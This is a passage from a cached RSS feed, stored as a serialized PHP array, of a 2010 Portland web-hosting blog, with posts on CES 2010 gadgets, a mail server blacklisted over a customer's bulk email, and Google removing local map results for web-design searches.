+After last [...]";s:12:"atom_content";s:21204:"<div class="tweetmeme_button" style="float: left; padding-right: 10px; padding-left: 10px; padding-bottom: 3px;"><a href="http://api.tweetmeme.com/share?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fces-show%2Fseo-ces-2010%2F"><img src="http://api.tweetmeme.com/imagebutton.gif?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fces-show%2Fseo-ces-2010%2F" height="61" width="51" /></a></div><p>My trip to the 2010 Consumer Electronics Show was unlike <a href="http://www.pdxtc.com/wpblog/ces-show/an-seo-goes-to-ces-2009-roundup/">last year</a>, or <a href="http://www.pdxtc.com/wpblog/ces-show/an-seo-goes-to-ces-2008-part-1/">any</a> other years <a href="http://www.pdxtc.com/wpblog/ces-show/an-seo-goes-to-ces-2008-part-1/">I&#8217;ve gone</a>, because I cut myself short on time.</p>
+<p>The organization of the show changed quite a bit, and in the past, all of the breakthrough inventions were situated in one giant hall, over at the <a href="http://www.sandsexpo.com/" target="_blank">Sands Expo Center</a>.</p>
+<p>After last year&#8217;s downsizing of the show, I was able to make it through that entire emerging technology area in just one day, and I found myself with a lot of time on my hands, so this year I decided to only come for one day.</p>
+<p>Little did I know, that this year, likely due to the economy, they would downsize even further and cut out the Sands entirely, cramming everything together in the big convention center.</p>
+<p>To make matters worse, rather than group all of these inventions in one space, they spread them throughout the entire show on red carpeted &#8220;<a href="http://www.cesweb.org/exhibits/displays/techZones.asp"target="_blank">Tech Zone</a>&#8221; areas, so I had no choice but to try and make it through the entire show in one day.</p>
+<p>Anyone who&#8217;s ever been there before knows that it&#8217;s impossible to see everything in one day, not to mention that it&#8217;s totally impossible to find all of the separated tech zones. </p>
+<p>Amazingly, I can swear that I&#8217;d pretty much walked and jogged up and down almost every square foot of the entire North Hall, Central Hall, and Southall, along with at least two of the second floors that I can remember.</p>
+<p>It was a whirlwind tour, and something I&#8217;ll never try again, because I really do feel somewhat slighted.</p>
+<p><strong>Why Do I Attend?</strong><br />
+My goal in going each year is to seek out new technology, products, trends and inventions, then buy domain names and begin development of some web properties to start to become visible in the SERPS. </p>
+<p>Generally, in the beginning there are no revenue opportunities, but soon, as they catch on, merchants create affiliate programs,  and we&#8217;ve got several well earning sites based on thing&#8217;s I&#8217;ve discovered at CES. </p>
+<p>&nbsp;</p>
+<p><strong>CES 2010 Was in 3D</strong><br />
+What struck me most all day long, was that I saw more 3D TV signs than I could believe.  Nearly every manufacturer seems to have 3-D TVs, and nearly all of them require that you wear glasses.</p>
+<p>Having just seen Avatar in 3D, I was pretty impressed, but I&#8217;m amazed that everyone is banking on the average American family wanting to put on glasses to watch TV.</p>
+<p>In the international area, I saw aftermarket vendors of fashionable 3-D glasses, all the way down to toddler size, and it wouldn&#8217;t surprise me if you could get 3-D lenses put in a set of Ray-Ban frames.</p>
+<p>I also saw screens to go on top of your monitors and handheld multimedia devices too, that would eliminate the need to have glasses. If you&#8217;re looking at non-3-D content you just take the screen off.</p>
+<p>Only Intel had a 3-D television that did not require glasses showing, so I&#8217;m sure we can expect that having to wear glasses will soon be a thing of the past.</p>
+<p>Besides my short stay, I also apparently forgot my headset and microphone, so dictating my summary when I got back that night was impossible.</p>
+<p>Instead, I used my Blackberry to make a few audio notes, and have only now finished organizing my thoughts and photos.</p>
+<p>Here, in no particular order, are my own personal CES 2010 highlights.</p>
+<p>&nbsp;</p>
+<p><strong>BlueTooth Rear View Mirror</strong><br />
+<img class="aligncenter size-full wp-image-1645" title="IMG00107" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG001071.jpg" alt="" width="450" height="337" /><br />
+Oregon has now passed a law that you can&#8217;t hold your phone to your head while you drive because steering takes two hands, so I was wondering if there would be any solar Bluetooth speakerphones, and there were.</p>
+<p>I was pretty impressed with the idea, as I wandered through the auto area, but then I came across this unit. This would be great, since I&#8217;ve usually got a dead Bluetooth headset.</p>
+<p>Caller ID scrolls across the mirror, and it&#8217;s a speakerphone AND it comes with an earpiece too, for when you prefer privacy.</p>
+<p>&nbsp;</p>
+<p><strong>USB 3.0</strong><br />
+<a href="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00108.jpg"><img class="aligncenter size-full wp-image-1644" title="IMG00108" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00108.jpg" alt="" width="450" height="337" /></a></p>
+<p>This isn&#8217;t really a particular product it&#8217;s just a technology, which will soon be everywhere, as it becomes widely adopted standard.</p>
+<p>This is a chart showing how fast USB 3.0 or the trademarked term &#8220;super USB&#8221; &#8211; <strong>You can transfer 27 gigs in 70 seconds!</strong></p>
+<p>Unless I miss my guess, would be increased size of flash drives, and these increased speed of data transfer, there&#8217;s no reason why my entire computer won&#8217;t someday be able to fit on my USB drive.</p>
+<p>For years we have been able to boot a computer from a USB stick, but with these increased speeds it&#8217;s going to be possible to do a lot more.  It wouldn&#8217;t surprise me at all if by this time next year, I&#8217;ll bet we are able to boot to the Google OS from a USB stick, browse the web, use Google docs, check mail etc., and even store local copies of documents that are created with the Google Docs platform.</p>
+<p>If you haven&#8217;t said <a href="http://www.pdxtc.com/wpblog/google/hello-google-operating-system-goodbye-microsoft/" target="_self">goodbye to Microsoft</a> already, I&#8217;d say that&#8217;ll be the day to sell your Microsoft stock.</p>
+<p>&nbsp;</p>
+<p><strong>Data Jack</strong><br />
+<img class="aligncenter size-full wp-image-1646" title="IMG00130" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00130.jpg" alt="" width="450" height="337" /></p>
+<p>In many cases, a brick-and-mortar location may be effectively &#8220;out of business&#8221; when their Internet connection goes down and there&#8217;s a company that&#8217;s being marketed as an &#8220;Internet access backup service&#8221;.</p>
+<p>Functioning through the cellular phone provider networks GSM / 3G connections, your connectivity is assured from almost anywhere, at speeds that are about three times faster than your old dial-up connection.</p>
+<p>They also offer daisy chaining and routing capability for multiple users, so at 40 bucks a month, seems like a pretty affordable insurance policy.</p>
+<p>&nbsp;</p>
+<p><strong>Personal Cell Tower &#8211; 5barz</strong><br />
+<img class="aligncenter size-full wp-image-1647" title="IMG00162" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00162.jpg" alt="" width="450" height="337" /></p>
+<p>A clever name for a clever solution to an ever frustrating problem, this is a cellular signal repeater, it&#8217;s going to be marketed as your own personal cell tower.</p>
+<p>It works with any carrier by multiplying any signal, even under ?half a bar&#8221; into a full strength five bar connection. (Don&#8217;t ask me why they can&#8217;t just build that into phones in the first place).</p>
+<p>&nbsp;</p>
+<p><strong>Thumb ring Blue-tooth</strong><br />
+<a href="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG001661.jpg"><img class="aligncenter size-full wp-image-1649" title="IMG00166" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG001661.jpg" alt="" width="450" height="337" /></a></p>
+<p>Fashion and technology are merging in many forms, and Bluetooth clothing is nothing new, but I thought this piece of jewelry was pretty slick.</p>
+<p>This is a Bluetooth cell phone accessory, with a vibrating thumb ring, with an LED display that&#8217;s large enough to read the caller ID.</p>
+<p><img class="aligncenter size-full wp-image-1650" title="IMG00165" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00165.jpg" alt="" width="450" height="337" /></p>
+<p>Should you decide to answer, simply twist it, and stick it in your ear. I  I didn&#8217;t stick around long enough to see if it had a speakerphone, but I&#8217;m guessing it does.</p>
+<p>&nbsp;</p>
+<p><strong>Man-powered Generator</strong><br />
+<img class="aligncenter size-full wp-image-1653" title="IMG00122" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00122.jpg" alt="" width="450" height="337" /></p>
+<p>What makes this unique, is that you can charge up this big box of power, and take it with you wherever you need to, since it has all of the necessary electrical connections to plug in any device from anywhere in the world.  </p>
+<p>There are adapters that allows you to use your bicycle, tricycle (so your kids can do the work), and for all I know, a hamster wheel adapter will be coming next!</p>
+<p>&nbsp;</p>
+<p><strong>The Storm &#8211; Digital TV Receiver</strong><br />
+<img class="aligncenter size-full wp-image-1654" title="IMG00129" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00129.jpg" alt="" width="450" height="337" /></p>
+<p>This dongle just plugs into your smart phone or laptop, and gives you free digital TV reception.  Of course, since free TV is probably going away entirely, its life may be limited, but it still seemed like a fun thing to have.</p>
+<p>I can remember being stuck at charity auction during a World Series game, and one of these would&#8217;ve been awesome to have. </p>
+<p>With this device, you can open up a TV screen, drag it to a second monitor, and if you&#8217;re on the road with a dual monitor laptop, you don&#8217;t have to try to figure out the hotels TV computer system <img src='http://www.pdxtc.com/wpblog/wp-includes/images/smilies/icon_wink.gif' alt=';)' class='wp-smiley' /> </p>
+<p>&nbsp;</p>
+<p><strong>Extra Laptop Monitor</strong><br />
+<img class="aligncenter size-full wp-image-1655" title="IMG00158" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00158.jpg" alt="" width="450" height="337" /></p>
+<p>Speaking of two monitors, I&#8217;m pretty spoiled with my multi-monitor setup at home, and when I travel, I can usually work just fine on my laptop. Some people though, are real road warriors, and need multiple monitors to be productive. For them, there&#8217;s now a solution.</p>
+<p>&nbsp;</p>
+<p><strong>Stylish Dresser Valet</strong><br />
+<img class="aligncenter size-full wp-image-1656" title="IMG00096" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00096.jpg" alt="" width="450" height="337" /></p>
+<p>Get rid of unsightly cord tangle, and the mess of having your E- equipment strewn all over the dresser with this stylish and fashionable electronic device caddy.</p>
+<p>Okay, maybe it&#8217;s not that technologically amazing, but it would make a pretty good Father&#8217;s Day present, wouldn&#8217;t it?</p>
+<p>&nbsp;</p>
+<p><strong>Tiny DVR</strong><br />
+<a href="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00102.jpg"><img class="aligncenter size-full wp-image-1657" title="IMG00102" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00102.jpg" alt="" width="336" height="248" /></a></p>
+<p>The camera doesn?t do this one justice, because the guy apparently moved his hand and I had my camera on a weird zoom thing,  but it&#8217;s a full functioning DVR that records to removable Flash memory.</p>
+<p>It&#8217;s designed to be a wearable or clip on spy cam, and it has motion sensing technology, easy on off switches, and the option to have the red recording light flash or not.</p>
+<p>&nbsp;</p>
+<p><strong>Solar Wing</strong><br />
+<a href="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG001441.jpg"><img class="aligncenter size-medium wp-image-1666" title="IMG00144" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG001441-300x225.jpg" alt="" width="300" height="225" /></a></p>
+<p>This solar car was built as a school project by engineering students in Japan. If you look closely, you can see that in the background the pictures on the wall show that this &#8220;wing&#8221; is visible on a flying airplane. I couldn&#8217;t tell if it was an artist rendering or a photograph of an existing prototype, but I think you get the idea.</p>
+<p>&nbsp;</p>
+<p><strong>Audio Egg</strong><br />
+<img class="aligncenter size-full wp-image-1652" title="IMG00173" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00173.jpg" alt="" width="450" height="337" /></p>
+<p>Okay, I do have to admit that I was impressed by the sound. It really was every bit as good as any pair of headphones I&#8217;ve ever tried. However, with the size being roughly 400 times larger than a good set of headphones, and a limited fashion colors available, I just don&#8217;t see them becoming widely adopted.</p>
+<p>&nbsp;</p>
+<p><strong>Bone Conduction Audio</strong><br />
+<img class="aligncenter size-full wp-image-1651" title="IMG00169" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00169.jpg" alt="" width="450" height="337" /></p>
+<p>It&#8217;s probably been two years since I first tried on a set of these bone conduction headphones, but there have been some technology breakthroughs and now, their popularity is spreading.</p>
+<p>The concept is that instead of sticking something in your ear, you can more comfortably wear it on top of your ear, and the vibration in your skull actually sounds as clear as a bell, just like you wearing a standard earbud.</p>
+<p>The technology was at multiple booths, and I believe it will continue to grow in popularity since so many people absolutely hate the way some of these things feel when they are inside your ear.</p>
+<p>&nbsp;</p>
+<p><strong>65 inch HD Combo Touchscreen Monitor &amp; Interactive Whiteboard</strong><br />
+<img class="aligncenter size-full wp-image-1659" title="IMG00168" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00168.jpg" alt="" width="450" height="337" /></p>
+<p>Need I say more?</p>
+<p>&nbsp;</p>
+<p><strong>Video Game  Seating</strong><br />
+<img class="aligncenter size-full wp-image-1660" title="IMG00167" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00167.jpg" alt="" width="450" height="337" /></p>
+<p>Due to cutting myself short on time, I didn&#8217;t get to drive a single lap or single mile this year, and as a former gameaholic, it was pretty disappointing.  I didn&#8217;t get to try any of the flight seats,  cockpits, driving consoles, beanbag chairs with speakers, or any other gaming furniture that only the most spoiled children on the planet usually get to own.</p>
+<p>&nbsp;</p>
+<p><strong>Hovering Spy-Craft</strong></p>
+<p><img class="aligncenter size-full wp-image-1645" title="IMG00107" src="http://www.pdxtc.com/wpblog/wp-content/uploads/xwing.jpg" alt="" width="326" height="294" /></p>
+<p>In just a tiny booth from an inventor, this little XWing is precisely maneuverable, and you can easily hover, go forward, backwards, and make tight corners. Check out this <a href="http://www.cnet.com.au/remote-control-x-wing-storms-ces-339300327.htm"target="_blank">Cnet video</a></p>
+<p>Believe it or not, the unit can be radio controlled from up to a mile away!  Never mind the fact that you can&#8217;t see it, but the guy does claim it works from a mile away.</p>
+<p>The black ones, from a bigger vensoldor, look like little military drones, and had similar maneuverability.</p>
+<p>How long it will be before civilians can attach one of those little cameras to these drones, and it also has internet or cell access to broadcast photos?</p>
+<p>People will be flying spy vehicles around their neighborhoods from their home computers pretty soon! Here&#8217;s a still image of one, and a quick video of the Xwing.</p>
+<p>&nbsp;</p>
+<p><strong>The Hall of Innovations</strong><br />
+I usually linger for a couple of hours in here, since  it&#8217;s where the awards are given for best of the show gone through the best of the entire show. This year though, I had to plow through pretty quickly, trying to reading the description lines of each sign, but I&#8217;m sure I missed some cool stuff. In many cases the device was too small or obscure looking, so it took a picture of the sign instead.</p>
+<p>&nbsp;</p>
+<p><strong>Start Your Car with an iPhone</strong><br />
+<a href="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG001522.jpg"><img class="aligncenter size-medium wp-image-1667" title="IMG00152" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG001522-300x225.jpg" alt="" width="300" height="225" /></a></p>
+<p>This is an iPhone app that will unlock or even start your vehicle. I hope there are safety precautions that would prevent you from starting a manual transmission vehicle while in gear, jumping it through your garage wall!</p>
+<p>&nbsp;</p>
+<p><strong>Power Line Gigabit Networking</strong><br />
+<a href="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00153.jpg"><img class="aligncenter size-medium wp-image-1668" title="IMG00153" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00153-300x225.jpg" alt="" width="300" height="225" /></a></p>
+<p>I really don&#8217;t know how slowly data used to travel over a network, but in 1997, if I had networked your office, we would&#8217;ve run cable everywhere in your office that a computer needed to be.</p>
+<p>Although there was technology for running data over phone lines, and even running data over all electrical lines, it never really caught on, and data typically traveled at 10 mb,  and it was quickly multiplied by 10 times, and 100mbs became the norm.  That jumped by 10 again, as 1000mb, or Gigabit speeds were introduced and today&#8217;s standard is &#8220;gigabit networking&#8221;.</p>
+<p>Now, gigabit speeds are available directly over your power lines, so no additional wiring is necessary beyond regular electrical.   Since this is 10 times faster than wireless, computers support it natively, right through their ethernet port,  it sure sounds to me like it&#8217;s poised to take over as the industry standard. Does new construction still typically have ethernet cable run?  I&#8217;ll bet it won&#8217;t for much longer&#8230;</p>
+<p>&nbsp;</p>
+<p><strong>Family Storage and Networked<br />
+BluRay</strong><br />
+<a href="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG001542.jpg"><img class="aligncenter size-medium wp-image-1669" title="IMG00154" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG001542-300x225.jpg" alt="" width="300" height="225" /></a></p>
+<p>An LG network storage device that was (umpteen?) terabytes in size, and even had a built-in Blu-Ray player to watch movies from anywhere in your home.</p>
+<p>&nbsp;</p>
+<p><strong>Built In Speakers</strong><br />
+<img class="aligncenter size-full wp-image-1670" title="IMG00156" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG001561.jpg" alt="" width="450" height="337" /></p>
+<p>Speakers are being built into everyday devices, in all sorts of furniture and appliances.  The technology really surrounds you in sound, and sounds great even over wireless connections. with no freestanding speakers to worry about and even no speaker wire for some of the models, I?m sure there?s lots more to come.</p>
+<p>&nbsp;</p>
+<p><strong>The Dorky Geektoy Award</strong><br />
+<img class="aligncenter size-full wp-image-1671" title="IMG00164" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00164.jpg" alt="" width="450" height="337" /></p>
+<p>Last year, the silliest thing I saw, (although functional) was a wire coat-hanger type device for holding your cell phone to your head to be &#8220;hands free&#8221;&#8230; seriously.</p>
+<p>Does this look equally as silly when you wear it?  Um, yeah&#8230;</p>
+<p><img class="aligncenter size-full wp-image-1672" title="IMG00163" src="http://www.pdxtc.com/wpblog/wp-content/uploads/IMG00163.jpg" alt="" width="450" height="337" /><br />
+Hat&#8217;s off, (literally) to this thing, designed to tuck your iPhone into the holder at the end of the visor, then slap it on your head, and put on your headphones, retreating into your own little universe of &#8220;private&#8221; viewing. Amazing.</p>
+<p>I have a few things I&#8217;ve held back, primarily because my wrists are sore, they weren&#8217;t that fascinating, or in a couple of cases, I need to get a site up first, before touting the technology.  <img src='http://www.pdxtc.com/wpblog/wp-includes/images/smilies/icon_wink.gif' alt=';)' class='wp-smiley' /> </p>
+<p>Next year I&#8217;m definitely staying for at least two full days&#8230;</p>
+";s:14:"date_timestamp";i:1263567320;}i:2;a:14:{s:5:"title";s:24:"Spam Blocked Mail Server";s:4:"link";s:65:"http://www.pdxtc.com/wpblog/web-hosting/spam-blocked-mail-server/";s:8:"comments";s:74:"http://www.pdxtc.com/wpblog/web-hosting/spam-blocked-mail-server/#comments";s:7:"pubdate";s:31:"Tue, 12 Jan 2010 09:05:08 +0000";s:2:"dc";a:1:{s:7:"creator";s:5:"Scott";}s:8:"category";s:32:"Web Hostingblacklisthostmailspam";s:4:"guid";s:35:"http://www.pdxtc.com/wpblog/?p=1632";s:11:"description";s:360:"We&#8217;ve had another web hosting customer screw things up for everyone else on their shared mail server by sending unsolicited e-mail, which is against our terms of service.
+I&#8217;ve written about this before, more than once, and this user has received no warnings, gets no second chances, and their web hosting account, including all e-mail service [...]";s:7:"content";a:1:{s:7:"encoded";s:3817:"<div class="tweetmeme_button" style="float: left; padding-right: 10px; padding-left: 10px; padding-bottom: 3px;"><a href="http://api.tweetmeme.com/share?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fweb-hosting%2Fspam-blocked-mail-server%2F"><img src="http://api.tweetmeme.com/imagebutton.gif?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fweb-hosting%2Fspam-blocked-mail-server%2F" height="61" width="51" /></a></div><p>We&#8217;ve had another web hosting customer screw things up for everyone else on their shared mail server by sending unsolicited e-mail, which is against our terms of service.</p>
+<p>I&#8217;ve written about this <a href="http://www.pdxtc.com/wpblog/web-hosting/portland-web-hosting-client-fired/" target="_blank">before</a>, more <a href="http://www.pdxtc.com/wpblog/web-hosting/another-web-hosting-client-fired/" target="_blank">than</a> once, and this user has received no warnings, gets no second chances, and their web hosting account, including all e-mail service has been permanently removed from our system.</p>
+<p><strong>What Happened? </strong><br />
+A user on a shared hosting account innocently sent out an email message to their customer list. At least one of their customers at a Comcast account, and one at a Hotmail account, reported the message as spam.</p>
+<p>The big email providers act quickly, so now one of our mail server IP addresses has been &#8220;spam flagged&#8221; by both Microsoft and Comcast. They are not letting mail from that particular server through to their users.</p>
+<p>A typical bounce message is something like this:</p>
+<p><a href="http://www.pdxtc.com/wpblog/wp-content/uploads/spamblock.jpg"><img class="aligncenter size-medium wp-image-1633" title="spamblock" src="http://www.pdxtc.com/wpblog/wp-content/uploads/spamblock-300x97.jpg" alt="" width="300" height="97" /></a></p>
+<p><strong>What has been done?</strong><br />
+On our end, the problem has been resolved, and we&#8217;ve proven to them that we have taken the necessary corrective measures, and now it&#8217;s just a matter of time, <em>up to 48 hours, before our mail is again allowed to come through to their services. </em>This time delay is unavoidable, and we are sorry for the inconvenience.</p>
+<p><strong>How can you send to your mailing list? </strong><br />
+As a reminder, you should never send bulk e-mail to your own mailing list through your own web hosting account.</p>
+<p>It doesn&#8217;t matter if your users have agreed to accept your messages or not, because all it takes is one person to complain to their ISP that you send them spam, and our mail server gets blocked.</p>
+<p>This causes a huge inconvenience to any other users that may be on that particular mail server, so therefore it is our policy here at PDXTC (and at most web hosts) to not allow any bulk e-mail messages to be sent from your account.</p>
+<p>Instead, you should use a third-party service, like <a rel="nofollow" href="http://www.pdxtc.com/intellicontact" target="_blank">Icontact</a> which begins at just $10 per month.</p>
+<p>They have industry-leading deliverability, and a third-party company, called Pivotal Veracity, scores their email deliverability rates between 98%-99%.</p>
+<p>You can track the performance of all emails sent at a glance with charts and graphs that are populated in real time.</p>
+<p>They offer 250 professionally designed email newsletter templates or you can use one of your own for your email marketing campaign, and it&#8217;s easy to set up, organize, and upload or import your contacts. They offer advanced features, like surveys, autoresponders, and RSS feeds in their easy-to-use all-inclusive product.</p>
+<p>They offer a <strong><a rel="nofollow" href="http://www.pdxtc.com/intellicontact" target="_blank">30 day free trial</a></strong> so you have nothing to lose.</p>
+";}s:3:"wfw";a:1:{s:10:"commentrss";s:70:"http://www.pdxtc.com/wpblog/web-hosting/spam-blocked-mail-server/feed/";}s:5:"slash";a:1:{s:8:"comments";s:1:"0";}s:7:"summary";s:360:"We&#8217;ve had another web hosting customer screw things up for everyone else on their shared mail server by sending unsolicited e-mail, which is against our terms of service.
+I&#8217;ve written about this before, more than once, and this user has received no warnings, gets no second chances, and their web hosting account, including all e-mail service [...]";s:12:"atom_content";s:3817:"<div class="tweetmeme_button" style="float: left; padding-right: 10px; padding-left: 10px; padding-bottom: 3px;"><a href="http://api.tweetmeme.com/share?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fweb-hosting%2Fspam-blocked-mail-server%2F"><img src="http://api.tweetmeme.com/imagebutton.gif?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fweb-hosting%2Fspam-blocked-mail-server%2F" height="61" width="51" /></a></div><p>We&#8217;ve had another web hosting customer screw things up for everyone else on their shared mail server by sending unsolicited e-mail, which is against our terms of service.</p>
+<p>I&#8217;ve written about this <a href="http://www.pdxtc.com/wpblog/web-hosting/portland-web-hosting-client-fired/" target="_blank">before</a>, more <a href="http://www.pdxtc.com/wpblog/web-hosting/another-web-hosting-client-fired/" target="_blank">than</a> once, and this user has received no warnings, gets no second chances, and their web hosting account, including all e-mail service has been permanently removed from our system.</p>
+<p><strong>What Happened? </strong><br />
+A user on a shared hosting account innocently sent out an email message to their customer list. At least one of their customers at a Comcast account, and one at a Hotmail account, reported the message as spam.</p>
+<p>The big email providers act quickly, so now one of our mail server IP addresses has been &#8220;spam flagged&#8221; by both Microsoft and Comcast. They are not letting mail from that particular server through to their users.</p>
+<p>A typical bounce message is something like this:</p>
+<p><a href="http://www.pdxtc.com/wpblog/wp-content/uploads/spamblock.jpg"><img class="aligncenter size-medium wp-image-1633" title="spamblock" src="http://www.pdxtc.com/wpblog/wp-content/uploads/spamblock-300x97.jpg" alt="" width="300" height="97" /></a></p>
+<p><strong>What has been done?</strong><br />
+On our end, the problem has been resolved, and we&#8217;ve proven to them that we have taken the necessary corrective measures, and now it&#8217;s just a matter of time, <em>up to 48 hours, before our mail is again allowed to come through to their services. </em>This time delay is unavoidable, and we are sorry for the inconvenience.</p>
+<p><strong>How can you send to your mailing list? </strong><br />
+As a reminder, you should never send bulk e-mail to your own mailing list through your own web hosting account.</p>
+<p>It doesn&#8217;t matter if your users have agreed to accept your messages or not, because all it takes is one person to complain to their ISP that you send them spam, and our mail server gets blocked.</p>
+<p>This causes a huge inconvenience to any other users that may be on that particular mail server, so therefore it is our policy here at PDXTC (and at most web hosts) to not allow any bulk e-mail messages to be sent from your account.</p>
+<p>Instead, you should use a third-party service, like <a rel="nofollow" href="http://www.pdxtc.com/intellicontact" target="_blank">Icontact</a> which begins at just $10 per month.</p>
+<p>They have industry-leading deliverability, and a third-party company, called Pivotal Veracity, scores their email deliverability rates between 98%-99%.</p>
+<p>You can track the performance of all emails sent at a glance with charts and graphs that are populated in real time.</p>
+<p>They offer 250 professionally designed email newsletter templates or you can use one of your own for your email marketing campaign, and it&#8217;s easy to set up, organize, and upload or import your contacts. They offer advanced features, like surveys, autoresponders, and RSS feeds in their easy-to-use all-inclusive product.</p>
+<p>They offer a <strong><a rel="nofollow" href="http://www.pdxtc.com/intellicontact" target="_blank">30 day free trial</a></strong> so you have nothing to lose.</p>
+";s:14:"date_timestamp";i:1263287108;}i:3;a:14:{s:5:"title";s:26:"Google is All Over the Map";s:4:"link";s:62:"http://www.pdxtc.com/wpblog/google/google-is-all-over-the-map/";s:8:"comments";s:71:"http://www.pdxtc.com/wpblog/google/google-is-all-over-the-map/#comments";s:7:"pubdate";s:31:"Wed, 06 Jan 2010 13:30:14 +0000";s:2:"dc";a:1:{s:7:"creator";s:5:"Scott";}s:8:"category";s:6:"Google";s:4:"guid";s:35:"http://www.pdxtc.com/wpblog/?p=1599";s:11:"description";s:337:"Google is all over the map in the way it displays search results,  but it looks like  SEO, web-hosting, and web design are not!
+Well, technically they&#8217;re still  &#8220;on the map&#8221;  but the map is not showing up any more in Google searches.
+Yes, in case you missed the news,  Google local map results are not being shown [...]";s:7:"content";a:1:{s:7:"encoded";s:9504:"<div class="tweetmeme_button" style="float: left; padding-right: 10px; padding-left: 10px; padding-bottom: 3px;"><a href="http://api.tweetmeme.com/share?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fgoogle%2Fgoogle-is-all-over-the-map%2F"><img src="http://api.tweetmeme.com/imagebutton.gif?url=http%3A%2F%2Fwww.pdxtc.com%2Fwpblog%2Fgoogle%2Fgoogle-is-all-over-the-map%2F" height="61" width="51" /></a></div><p>Google is all over the map in the way it displays search results,  but it looks like  SEO, web-hosting, and web design are not!</p>
+<p>Well, technically they&#8217;re still  &#8220;on the map&#8221;  but the map is not showing up any more in Google searches.</p>
+<p>Yes, in case you missed the news,  Google local map results are not being shown any more for web designers, for search marketing firms,  or web hosting.</p>
+<p><strong>Why? </strong><br />
+It&#8217;s still unclear, and to my knowledge, there&#8217;s been no definitive explanation from Google.</p>
+<p>As a local webhost / search marketer / developer, I&#8217;d like to point out that this sort of&#8230; well&#8230;  sucks to be singled out, and to me it makes no sense.</p>
+<p><strong>A Little History for Beginners</strong><br />
+Google introduced local map results into the mix quite a while ago, and they&#8217;ve changed when and how they display several times.</p>
+<p>After PPC ads came along, searching for a local business showed like this -</p>
+<p><img class="aligncenter size-full wp-image-1617" title="nolocal" src="http://www.pdxtc.com/wpblog/wp-content/uploads/nolocal.jpg" alt="" width="360" height="285" /></p>
+<p>About two years ago, they started showing a map, and either one or three results, when someone did a search that included a geographic target.</p>
+<p><img class="aligncenter size-full wp-image-1604" title="3 pack results" src="http://www.pdxtc.com/wpblog/wp-content/uploads/3pack.jpg" alt="" width="360" height="288" /></p>
+<p>Then in January of 2008, <a href="http://www.pdxtc.com/wpblog/google/google-doubles-front-page-real-estate/" target="_blank">they dramatically tripled the front page real estate</a> to show TEN results,  although late last year they knocked that number back to just seven.</p>
+<p><img class="aligncenter size-full wp-image-1605" title="7 pack search" src="http://www.pdxtc.com/wpblog/wp-content/uploads/7pack.jpg" alt="" width="360" height="333" />(<a href="http://www.redcardinal.ie" target="_blank">photos source</a>)</p>
+<p>Obviously this had the effect of pushing the organic search results even further down the page,  below the PPC ads and below the map results, effectively making the number one organic spot appear in what is really the 14th position.</p>
+<p>The entire web marketing industry changed for local businesses, and a new niche was born, with a <a href="http://www.davidmihm.com/local-search-ranking-factors.shtml" target="_blank">different set of ranking factors</a> almost completely unrelated to typical SEO.</p>
+<p><strong>What&#8217;s Happening Now?</strong><br />
+Nearly two months ago, November 2009, they began to <a href="http://blumenthals.com/blog/2009/11/06/has-google-maps-fixed-the-onebox-problem/" target="_blank">make some more changes</a>, and then suddenly were not showing ANY map results for &#8220;web design&#8221; when a city name was included.</p>
+<p>This was followed quickly by Web hosting, and they have now removed the map results from all SEO, and Internet marketing services type phrases too! Huh.</p>
+<p>On December 14th Brian, a Google employee  <a href="http://www.google.com/support/forum/p/maps/thread?fid=19f4b0936485546a0004764ffd35db73&amp;hl=en" target="_blank">noted on another thread</a> -</p>
+<blockquote><p>&#8230;it looks like a lot of the recent search examples on this thread have to do with web design, SEO, and other services of that sort.</p>
+<p>It?s possible that instead of being related to the original issue, Google.com doesn?t bring up map results for these types of searches because the search term doesn?t show much local intent.</p></blockquote>
+<p>Oh really? There&#8217;s no local intent on a search for Portland web host?  Puh-lease.</p>
+<p>On December 31, a <a href="http://www.google.com/support/forum/p/maps/thread?tid=1f506c6b4fd31f70&amp;hl=en#all" target="_blank">Google employee caused quite a stir</a> when he said this:</p>
+<blockquote><p>Today, we?re intentionally showing less local results for web design / SEO queries. For example, [web design sacramento] doesn?t display local listings today.</p>
+<p>We believe this is an accurate representation of user intent. In some cases, we do show local listings, however (as NSNA/php-er noted) [web design in bellingham].</p>
+<p>I?m sure some of you feel we should be displaying local results for queries like [Web Design Vancouver]. I understand that concern, but based on our understanding of our users, we feel this is the right decision for now.</p></blockquote>
+<p><strong>But using &#8220;In&#8221; Counts? </strong><br />
+Before Joel from Google replied, someone pointed out that using the word &#8220;in&#8221; does trigger the maps, but Joel didn&#8217;t address that at all.</p>
